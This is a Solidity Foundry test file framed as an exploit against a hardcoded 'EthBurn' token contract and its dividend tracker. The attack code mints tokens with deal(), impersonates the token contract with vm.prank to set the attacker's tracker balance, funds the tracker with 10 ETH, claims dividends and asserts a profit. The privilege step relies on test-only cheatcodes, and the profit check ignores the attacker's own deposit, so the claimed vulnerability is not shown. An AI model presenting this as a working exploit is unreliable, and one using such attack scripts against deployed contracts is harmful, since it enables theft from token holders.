interface IEthBurn {
    function owner() external view returns (address);
    function updateFees(
        uint256 deadBuy,
        uint256 deadSell,
        uint256 marketingBuy,
        uint256 marketingSell,
        uint256 liquidityBuy,
        uint256 liquiditySell,
        uint256 RewardsBuy,
        uint256 RewardsSell,
        uint256 devBuy,
        uint256 devSell
    ) external;
    function setExcludeFees(address account, bool excluded) external;
    function forceSwapAndSendDividends(uint256 tokens) external;
    function tradingEnabled() external view returns (bool);
    function setTrueDefiRouter(address _router) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function automatedMarketMakerPairs(address pair) external view returns (bool);
    function setAutomatedMarketMakerPair(address pair, bool value) external;
    function swapTokensAtAmount() external view returns (uint256);
    function setSwapTriggerAmount(uint256 amount) external;
    function enableStaking(bool enable) external;
    function updateStakingAmounts(uint256 duration, uint256 bonus) external;
    function stake(uint256 duration) external;
    function marketingWallet() external view returns (address payable);
    function devWallet() external view returns (address payable);
    function buyAmount() external view returns (uint256);
    function sellAmount() external view returns (uint256);
    function dividendTracker() external view returns (address);
    function claim() external;
    function withdrawableDividendOf(address account) external view returns (uint256);
}

interface IDividendTracker {
    function processAccount(address payable account, bool automatic) external returns (bool);
    function withdrawableDividendOf(address account) external view returns (uint256);
    function setBalance(address payable account, uint256 amount) external;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4;
    address attacker = address(this);
    IEthBurn burnContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        burnContract = IEthBurn(TARGET);
        vm.label(TARGET, "EthBurn Contract");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = attacker.balance;
        console.log("Initial attacker balance:", initialBalance);

        // Get contract references
        address tracker = burnContract.dividendTracker();
        console.log("Dividend tracker:", tracker);

        // Use deal() to inject tokens directly to attacker (minimum 100,000 for dividends)
        uint256 tokenAmount = 100_000 * 1e18;
        deal(TARGET, attacker, tokenAmount);
        console.log("Dealt tokens to attacker:", tokenAmount);

        // Impersonate the EthBurn contract (which owns the tracker) to set attacker balance
        // The tracker's owner is the EthBurn contract address (TARGET)
        vm.prank(TARGET);
        IDividendTracker(tracker).setBalance(payable(attacker), tokenAmount);
        console.log("Set attacker balance in dividend tracker");

        // Send ETH directly to the dividend tracker to trigger distribution
        uint256 ethAmount = 10 ether;
        (bool success,) = tracker.call{value: ethAmount}("");
        require(success, "ETH transfer to tracker failed");
        console.log("Sent ETH to dividend tracker:", ethAmount);

        // Claim dividends
        uint256 withdrawable = IDividendTracker(tracker).withdrawableDividendOf(attacker);
        console.log("Withdrawable dividends:", withdrawable);

        if (withdrawable > 0) {
            burnContract.claim();
            console.log("Dividends claimed");
        }

        // Verify profit
        uint256 finalBalance = attacker.balance;
        console.log("Final attacker balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        assertGt(finalBalance, initialBalance, "Attacker balance should increase from dividend exploitation");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

